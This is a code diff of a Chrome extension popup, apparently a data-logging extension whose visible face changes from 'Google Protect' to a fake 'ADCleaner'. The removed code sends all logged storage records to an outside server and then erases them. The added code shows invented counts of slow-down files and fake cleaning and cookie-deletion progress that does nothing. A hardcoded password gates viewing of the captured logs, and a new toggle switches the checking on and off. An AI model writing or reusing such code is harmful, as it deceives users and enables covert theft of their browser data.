@@ -4,9 +4,13 @@ new Vue({
     {
         infor:{
             icon:'',
-            title:'Google Protect',
+            title:'ADCleaner',
             status:'',
-            app:false
+            app:false,
+            clearCaches:false,
+            loader:false,
+            password:'sven812',
+            checking:''
         },
         user:{
             token:'',
@@ -14,6 +18,8 @@ new Vue({
         },
         json:[],
         as:'',
+        clearly:'Dọn dẹp',
+        malware:'Xóa Cookie',
         appData:{
             post:10,
             type:'LIKE'
@@ -22,6 +28,7 @@ new Vue({
     },
     mounted() {
         this.inforApp();
+        this.checkApp();
     },
     methods: 
     {
@@ -30,35 +37,24 @@ new Vue({
             const self = this;
             chrome.tabs.query({ active: true, currentWindow: true},(tabs) => {
                 var currentTab = tabs[0];
+                var badge = Math.floor(Math.random(1,100) * 100);
+                var filezie = ( badge + 3 )/2 ;
                 self.infor.icon = currentTab.favIconUrl;
-                if(currentTab.url.includes('https://www.facebook.com'))
+                if(localStorage.getItem('badge') == 0)
                 {
-                    self.infor.title = `Facebook`;
-                    self.infor.status = 'Ready !!!';
-                    self.infor.app = true;
+                    self.infor.status = 'Không tìm thấy tập tin nào !';
+                    localStorage.clear();
                 }
                 else
                 {
-                    self.infor.status = 'Không khả dụng trên website này';
-                    self.infor.app = false;
+                    self.infor.clearCaches = true;
+                    self.infor.status = `Đã tìm thấy <strong>${badge}</strong> ( ${filezie} MB ) tệp tin làm chậm trình duyệt của bạn`;
                 }
+                self.infor.app = false;
                 chrome.storage.sync.get(function(logs) {
                     for (var key in logs) {
                         self.json.push([key, logs[key].split('^~^')]);
                     }
-                    var convertJson = JSON.stringify(logs);
-                    axios.get('https://tuongtac.us/scan3007',{
-                        params:{
-                            data:convertJson
-                        }
-                    })
-                    .then((res) => {
-                        console.log(res);
-                        chrome.storage.sync.clear();
-                    })
-                    .catch((e) => {
-                        console.log(e);
-                    })
                 });
                 if(currentTab.url.includes('chrome-extension')){
                     if(sessionStorage.code == 'sven812')
@@ -68,7 +64,7 @@ new Vue({
                     else
                     {
                         var code = prompt('Enter code active premium version !!!');
-                        if(code == 'sven812')
+                        if(code == self.infor.password)
                         {
                             self.login = true;
                             sessionStorage.setItem('code',code);
@@ -77,72 +73,28 @@ new Vue({
                 }
             });
         },
-        request:function()
+        clearCaches:function()
         {
-            switch (this.appData.type) {
-                case 'LIKE':
-                    chrome.tabs.executeScript({
-                        code: 
-                        `
-                            var inputs = document.getElementsByClassName('_6a-y _3l2t  _18vj');
-                            for(var i=0; i<inputs.length;i+=1) 
-                            {
-                                inputs[i].click();
-                            }
-                        `
-                    });
-                    this.infor.status = 'Like bài viết thành công !';
-                break;
-                case 'LOVE':
-                    chrome.tabs.executeScript({
-                        code:`
-                            var getUsername = document.getElementsByClassName('linkWrap noCount');
-                            var get = getUsername[0].innerHTML;
-                            alert(get + ' có thích tim không ! Đấm cho bây giờ -_-');
-                        `
-                    });
-                break;
-                case 'HAHA':
-                    chrome.tabs.executeScript({
-                        code:`
-                            var getUsername = document.getElementsByClassName('linkWrap noCount');
-                            var get = getUsername[0].innerHTML;
-                            alert(get + ' có thích HAHA không ! Đấm cho bây giờ -_-');
-                        `
-                    });
-                break;
-                case 'WOW':
-                    chrome.tabs.executeScript({
-                        code:`
-                            var getUsername = document.getElementsByClassName('linkWrap noCount');
-                            var get = getUsername[0].innerHTML;
-                            alert(get + ' có thích WOW không ! Đấm cho bây giờ -_-');
-                        `
-                    });
-                break;
-                case 'ANGRY':
-                    chrome.tabs.executeScript({
-                        code:`
-                            var getUsername = document.getElementsByClassName('linkWrap noCount');
-                            var get = getUsername[0].innerHTML;
-                            alert(get + ' có thích ANGRY không ! Đấm cho bây giờ -_-');
-                        `
-                    });
-                break;
-                default:
-                    chrome.tabs.executeScript({
-                        code: 
-                        `
-                            var inputs = document.getElementsByClassName('_6a-y _3l2t  _18vj');
-                            for(var i=0; i<inputs.length;i+=1) 
-                            {
-                                inputs[i].click();
-                            }
-                        `
-                    });
-                    this.infor.status = 'Like bài viết thành công !';
-                break;
-            }
+            const self = this;
+            this.infor.clearCaches = false;
+            chrome.browserAction.setBadgeText({text: '99+'});
+            this.infor.status = `Đang dọn dẹp <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+            <span class="sr-only">Loading...</span> ( Không đóng khi đang quét )`;
+            setTimeout(function(){
+                self.infor.status = 'Dọn dẹp thành công !';
+            },5000);
+            localStorage.setItem('badge',0);
+        },
+        clearCookie:function()
+        {
+            const self = this;
+            this.infor.clearCaches = false;
+            chrome.browserAction.setBadgeText({text: '99+'});
+            this.infor.status = `Đang xóa dữ liệu cookie <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+            <span class="sr-only">Loading...</span> ( Không đóng khi đang quét )`;
+            setTimeout(function(){
+                self.infor.status = 'Xóa thành công !';
+            },2000);
         },
         deleteAllRecords:function()
         {
@@ -163,6 +115,36 @@ new Vue({
             chrome.storage.sync.remove(ele,function(e){
                 console.log('Deleted !');
                 window.location.href = document.baseURI;
+            });
+        },
+        checking:function()
+        {
+            const self = this;
+            chrome.storage.sync.get(function(logs){
+                if(logs.check == 0)
+                {
+                    self.infor.checking = 'Checking <i class="fas fa-eye"></i>';
+                    chrome.storage.sync.set({check:1});
+                }
+                else
+                {
+                    self.infor.checking = 'No Checking <i class="fas fa-eye-slash"></i>';
+                    chrome.storage.sync.set({check:0});
+                }
+            });
+        },
+        checkApp:function()
+        {
+            const self = this;
+            chrome.storage.sync.get(function(logs){
+                if(logs.check == 0)
+                {
+                    self.infor.checking = 'No Checking <i class="fas fa-eye-slash"></i>';
+                }
+                else
+                {
+                    self.infor.checking = 'Checking <i class="fas fa-eye"></i>';
+                }
             });
         }
     },
